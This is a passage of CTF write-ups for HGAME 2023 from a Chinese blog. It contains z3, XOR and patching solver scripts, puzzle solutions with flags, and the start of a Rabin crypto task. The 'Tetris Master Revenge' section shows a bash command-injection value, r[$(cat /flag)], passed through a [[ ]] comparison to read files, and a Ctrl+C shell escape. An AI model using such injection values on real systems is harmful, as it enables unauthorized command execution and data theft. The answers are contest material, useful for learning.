<span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> )</span><br><span class="line">s.add( (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>)^c[<span class="number">0</span>])</span><br><span class="line">s.add(num[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)^c[<span class="number">1</span>])</span><br><span class="line">s.add(num[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)^c[<span class="number">2</span>])</span><br><span class="line">s.add(num[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)^c[<span class="number">3</span>])</span><br><span class="line">s.add(num[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>)^c[<span class="number">4</span>])</span><br><span class="line">s.add(num[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>)^c[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    key.append(m[num[i]].as_long())</span><br><span class="line"></span><br><span class="line">flag = [(c[i]^key[i%<span class="number">13</span>])%<span class="number">128</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="patchme"><a href="#patchme" class="headerlink" title="patchme"></a>patchme</h3><blockquote><p>不会pwn的re手不是一个好CTFer！游戏规则：修复程序中的二进制安全漏洞，要求能严格执行原程序的正常功能且不变动文件大小，如果修复成功，在运行后输入任何内容即可输出flag。附件更新，增加部分源码以作提示：<a href="https://share.weiyun.com/Kj85naWl">https://share.weiyun.com/Kj85naWl</a></p></blockquote><p>在 <code>init()</code> 中调用 <code>sub_1887()</code>，而 <code>sub_1887()</code> 里对 <code>loc_14C6</code> 区域的数据进行异或 <code>0x66</code> 操作，类似于SMC反调试，用IDA代码还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = <span class="number">0x0014c6</span>;</span><br><span class="line">    auto i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">960</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>0x14CA</code> 处按P识别为函数 <code>sub_14CA()</code>，看到主要逻辑为字符两两异或操作，还原即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">s</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">x = [<span class="number">0x5416D999808A28FA</span>,<span class="number">0x588505094953B563</span>,<span class="number">0xCE8CF3A0DC669097</span>,<span class="number">0x4C5CF3E854F44CBD</span>,<span class="number">0xD144E49916678331</span>,<span class="number">0xDA616BAC</span>,<span class="number">0xBBD0</span>,<span class="number">0x55</span>]</span><br><span class="line">y = [<span class="number">0x3B4FA2FCEDEB4F92</span>,<span class="number">0x7E45A6C3B67EA16</span>,<span class="number">0xAFE1ACC8BF12D0E7</span>,<span class="number">0x132EC3B7269138CE</span>,<span class="number">0x8E2197EB7311E643</span>,<span class="number">0xAE540AC1</span>,<span class="number">0xC9B5</span>,<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">x = change(x)</span><br><span class="line">y = change(y)</span><br><span class="line"></span><br><span class="line">flag = [x[i]^y[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><blockquote><p>C++是一门非常好的语言，他好就好在了逆向比较难😜</p></blockquote><p>去了符号，IDA分析伪码很难看，分析主要加密逻辑在 <code>sub_1400026A0()</code>，vftable中分别有 <code>encrypt1</code> 和 <code>encrypt2</code>，对应的函数表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">encrypt1</span><br><span class="line">sub_140001600 0</span><br><span class="line"></span><br><span class="line">encrypt2</span><br><span class="line">sub_140002E60 0</span><br><span class="line">sub_140001710 8</span><br><span class="line">sub_140001E30 16</span><br><span class="line">sub_1400022F0 24</span><br><span class="line">sub_1400027A0 32</span><br><span class="line">sub_140002B90 40</span><br><span class="line">sub_140003080 48</span><br></pre></td></tr></table></figure><p><code>encrypt1</code> 中 <code>sub_140001600()</code> 为异或操作，<code>encrypt2</code> 中一系列操作为加密运算+最后比对密文。</p><p>输入测试数据，在最后的密文比对函数 <code>sub_140003080()</code> 下断点，动调提取出测试数据对应的加密结果以及异或操作的key值，根据key值和明密文来确定异或计算逻辑为，每4位密文反向异或每4位key值。</p><p>最后用实际密文与key异或操作还原明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">key = [</span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0xA0</span>, <span class="number">0x37</span>, <span class="number">0x40</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0xDA</span>, <span class="number">0xFD</span>, <span class="number">0x21</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x3C</span>, <span class="number">0xAF</span>, <span class="number">0xD9</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0xB9</span>, <span class="number">0x47</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x4E</span>, <span class="number">0xEC</span>, <span class="number">0x0D</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x32</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x3A</span>, <span class="number">0xA7</span>, <span class="number">0x50</span>, <span class="number">0x5D</span>, <span class="number">0x02</span>, <span class="number">0x82</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x83</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x50</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0x98</span>, <span class="number">0xA1</span>, <span class="number">0x41</span>, <span class="number">0x36</span>, <span class="number">0x4C</span>, <span class="number">0x31</span>, </span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0x52</span>, <span class="number">0x90</span>, <span class="number">0xF1</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, <span class="number">0x0F</span>, <span class="number">0x6C</span>, <span class="number">0x2A</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xDF</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x7F</span>, <span class="number">0xE6</span>, <span class="number">0xA2</span>, <span class="number">0xE0</span>, <span class="number">0x59</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0x46</span>, <span class="number">0x5D</span>, <span class="number">0x29</span>, <span class="number">0x38</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(c[i]^key[i+<span class="number">3</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">1</span>]^key[i+<span class="number">2</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">2</span>]^key[i+<span class="number">1</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">3</span>]^key[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 2</title>
    <link href="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/"/>
    <id>https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/</id>
    <published>2023-01-20T09:25:16.000Z</published>
    <updated>2023-01-20T11:58:46.830Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 8</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><blockquote><p>你是否已经厌倦了普通的游戏题目，对于写脚本玩游戏感到无聊？ 此题你需要能够实现RCE，拿到根目录下的flag，又或者你是真正的Tetris Master？ </p><p>请使用ssh进行连接，账号为ctf,密码为hgame，例如ssh ctf@week-2.hgame.lwsec.cn -p port。并且你需要将终端的字体调小，使窗口大小至少为 200 * 70 才能正常进行游戏。</p><p>HINTS:</p><p>题目描述已更新，同时由于存在非预期，题目分数降至50,并上线100分的Revenge版本。</p></blockquote><p>连接：<code>ssh ctf@week-2.hgame.lwsec.cn -p 32150</code></p><p>按 Ctrl+C 强制结束拿到shell，<code>cat flag</code> 得flag：<code>hgame&#123;Bash_Game^Also*Can#Rce&#125;</code>。</p><p>​    </p><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><blockquote><p>the same as Tetris Master</p></blockquote><p>bash命令执行，参考ByteCTF 2022 - bash_game，在读入 <code>target</code> 值进入 <code>paint_game_over()</code> 内，比较时 <code>[[]]</code> 操作符会造成RCE。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">paint_game_over</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> xcent=$((`tput lines`/<span class="number">2</span>)) ycent=$((`tput cols`/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">local</span> x=$((xcent-<span class="number">4</span>)) y=$((ycent-<span class="number">25</span>))</span><br><span class="line">    <span class="keyword">for</span> (( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+i)</span>);<span class="variable">$&#123;y&#125;</span>H\033[44m<span class="variable">$&#123;good_game[$i]&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -eq <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt 50000 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m`cat /flag`\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -ne <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);;<span class="subst">$((ycent+1)</span>)H\033[44mKeep Going\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m<span class="variable">$&#123;score&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssh连接，选择 <code>n</code>，输入目标分数 <code>r[$(cat /flag)]</code>，确认进入游戏，快速结束一局后在结果处以报错形式输出flag：<code>hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;</code>。</p><p>​    </p><h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><blockquote><p>兔兔没有抢到回家的车票，一个猫猫头像的学长给了他一个候补车票抢票软件，但是这个软件的验证码太难了，你能帮他解一下吗？ flag 英文字母为全小写，自行使用 hgame{}包裹后提交</p></blockquote><p>五个部分：</p><p>Part1：base64+base58+base32，得到 <code>f51d3a18</code>；</p><p>Part2：md5，得到 <code>f91c</code>；</p><p>Part3：sha1，得到 <code>4952</code>；</p><p>Part4：sha256，得到 <code>a3ed</code>；</p><p>Part5：rot21，得到 <code>Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format.</code></p><p>按UUID格式连接得flag： <code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code>。</p><p>​    </p><h3 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h3><blockquote><p>兔兔在买年货,但是看着商家的付款二维码犯了难</p></blockquote><p>png图片的二维码无法扫描，使用<a href="https://merricx.github.io/qrazybox/">QRazyBox</a>导入，利用自带工具 Brute-force Format Info Pattern 可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Decoded Message :</span><br><span class="line">QDjkXkpM0BHNXujs</span><br><span class="line">Error Correction Level : H</span><br><span class="line">Mask Pattern : 4</span><br></pre></td></tr></table></figure><p>使用 <code>QDjkXkpM0BHNXujs</code> 解压zip压缩包，得到25张分割的二维码图片，以及一个25长度的数组。</p><p>1为90°旋转，2为180°旋转，3为270°旋转，0为不旋转，?为需选择其中一个值调整。</p><p>按照5×5拼接好后扫描得到flag：<code>hgame&#123;Cr42y_qrc0de&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><blockquote><p>看起来非常像RSA呢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span 